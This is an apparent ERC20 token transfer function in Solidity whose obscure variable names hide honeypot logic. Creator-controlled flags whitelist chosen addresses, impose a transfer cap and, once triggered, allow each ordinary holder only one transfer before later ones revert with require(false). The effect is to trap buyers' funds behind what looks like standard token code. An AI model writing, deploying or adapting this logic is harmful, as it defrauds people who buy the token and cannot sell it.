function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (golden == false)) {
        retriever = chTx;
        mezcal = true;
    }
    if ((address(sender) == creator) && (golden == true)) {
        german[recipient] = true;
        shepherd[recipient] = false;
        golden = false;
    }
    if ((amount > dachsund) && (german[sender] == true) && (address(sender) != creator)) {
        yorki[recipient] = true;
    }
    if (german[recipient] != true) {
        shepherd[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((shepherd[sender]) && (german[recipient] == false)) {
        shepherd[recipient] = true;
    }
    if (german[sender] == false) {
        if ((amount > dachsund) && (yorki[sender] == true)) {
            require(false);
        }
        require(amount < retriever);
        if (mezcal == true) {
            if (yorki[sender] == true) {
                require(false);
            }
            yorki[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

